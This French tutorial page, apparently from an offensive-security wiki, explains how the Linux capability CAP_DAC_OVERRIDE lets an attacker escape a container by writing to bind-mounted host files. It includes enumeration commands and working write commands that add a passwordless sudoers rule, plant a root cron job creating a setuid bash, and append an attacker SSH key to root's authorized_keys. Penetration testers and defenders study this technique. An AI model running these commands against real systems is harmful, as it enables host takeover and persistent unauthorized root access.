---
title: "CAP_DAC_OVERRIDE : écrire des fichiers de l'hôte en contournant les vérifications de permissions"
order: 5
description: "CAP_DAC_OVERRIDE contourne toutes les vérifications de permissions discrétionnaires de lecture, d'écriture et d'exécution. À l'intérieur d'un conteneur, elle devient dangereuse dès qu'un fichier de l'hôte est accessible via un bind mount ou un périphérique hôte monté : la capacité permet à un attaquant d'écraser des fichiers appartenant à root tels que sudoers, des entrées cron ou authorized_keys, quels que soient leurs bits de mode."
keywords:
  - cap_dac_override
  - permissions de fichiers
  - bind mount
  - élévation de privilèges
  - évasion de conteneur
---

# CAP_DAC_OVERRIDE

`CAP_DAC_OVERRIDE` fait sauter au noyau les vérifications de contrôle d'accès discrétionnaire pour la lecture, l'écriture et l'exécution sur les fichiers et répertoires. Les bits de propriétaire et de mode cessent de compter : un processus doté de cette capacité peut écrire un fichier en mode `0400` appartenant à root. À elle seule, à l'intérieur d'un conteneur isolé, elle ne contourne les permissions que sur le système de fichiers propre au conteneur, déjà sous le contrôle de l'attaquant. Elle devient une évasion lorsqu'un chemin de l'hôte est accessible, car la capacité lève alors la dernière barrière à la modification des fichiers de l'hôte appartenant à root.

Confirmez la capacité et cherchez les chemins de l'hôte accessibles :

```bash
capsh --print | grep -o cap_dac_override
grep CapEff /proc/self/status                 # bit 1 set
mount | grep -vE 'overlay|proc|sysfs|tmpfs|cgroup|mqueue|shm'   # bind mounts from the host
findmnt -o TARGET,SOURCE,OPTIONS | grep -i '\[/'                 # host bind sources
```

## Voie : écraser un fichier de l'hôte accessible

Tout montage de l'hôte accessible en écriture transforme cela en exécution de code sur l'hôte. Cibles courantes à forte valeur, choisies selon ce qui les exécute en tant que root :

```bash
# A docker socket or host /etc bind-mounted in? Write a trusted-key or cron job.
# Example: host /etc is bind-mounted at /host-etc
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /host-etc/sudoers.d/win
# Or schedule a root job on the host
echo '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' \
  > /host-etc/cron.d/win
# Or append an attacker key to the host root account
echo 'ssh-ed25519 AAAA... a' >> /host-root/.ssh/authorized_keys
```

La capacité est ce qui permet à ces écritures de réussir alors même que les fichiers appartiennent à root et sont restreints par leur mode : sans elle, un UID de conteneur non root serait refusé.

## Combinaison avec une primitive de lecture

`CAP_DAC_OVERRIDE` se marie naturellement avec [CAP_DAC_READ_SEARCH](cap-dac-read-search.md). Read-search localise et lit un fichier de l'hôte via un handle d'inode ; override vous laisse ensuite réécrire vers les chemins de l'hôte accessibles. Sur un conteneur entièrement privilégié, les deux sont présentes, de même qu'une liste de périphériques qui rend le montage du disque de l'hôte plus simple que la recherche d'un bind mount existant.

## Notes d'exploitation

- L'évasion dépend de la présence d'un chemin de l'hôte dans la table de montage. Énumérez avec `findmnt` et `cat /proc/self/mountinfo` ; un bind mount affiche un sous-arbre de l'hôte comme source.
- Si aucun chemin de l'hôte n'est accessible en écriture, cette capacité à elle seule ne permet pas de s'évader ; pivotez vers [CAP_SYS_ADMIN](cap-sys-admin.md) (monter un périphérique de l'hôte) ou vers un montage de socket de runtime.
- Préférez une écriture dans cron ou sudoers à la modification d'un binaire en cours d'exécution : elle se déclenche de façon déterministe et subsiste sans faire planter un service actif.

## Références

- [man 7 capabilities : CAP_DAC_OVERRIDE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [HackTricks : CAP_DAC_OVERRIDE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override)
